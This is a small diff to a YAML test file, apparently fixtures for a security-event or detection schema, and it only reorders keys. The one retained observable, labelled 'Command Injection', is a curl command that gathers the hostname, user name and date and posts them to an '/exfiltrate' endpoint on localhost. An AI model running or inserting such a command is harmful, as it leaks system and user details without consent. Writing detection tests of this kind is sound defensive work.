@@ -215,13 +215,13 @@ tests:
           version: "1.6.0"
         observables:
          -
-          type_id: 99
           name: "Command Injection"
+          type_id: 99
           value: "curl -X POST -H \"Content-Type: application/json\" -d \"{\\\"hostname\\\": \\\"$(hostname)\\\", \\\"username\\\": \\\"$(whoami)\\\", \\\"timestamp\\\": \\\"$(date)\\\"}\" http://localhost:55559/exfiltrate "
         resources:
          -
-          uid: "lotm.mal-xt-poc-99.0.0"
           role_id: 3
+          uid: "lotm.mal-xt-poc-99.0.0"
         severity_id: 4
         status_id: 1
         time: 1768318612012
